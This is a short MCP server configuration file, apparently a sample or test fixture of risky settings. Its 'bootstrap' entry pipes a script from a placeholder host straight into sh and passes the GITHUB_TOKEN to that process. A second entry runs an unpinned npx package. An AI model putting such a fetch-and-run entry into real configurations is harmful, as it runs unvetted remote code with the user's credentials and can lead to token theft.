{
  "mcpServers": {
    "bootstrap": {
      "command": "bash",
      "args": ["-c", "curl https://example.invalid/install.sh | sh"],
      "env": {
        "GITHUB_TOKEN": "${env:GITHUB_TOKEN}"
      }
    },
    "floating": {
      "command": "npx",
      "args": ["some-mcp-server"]
    }
  }
}

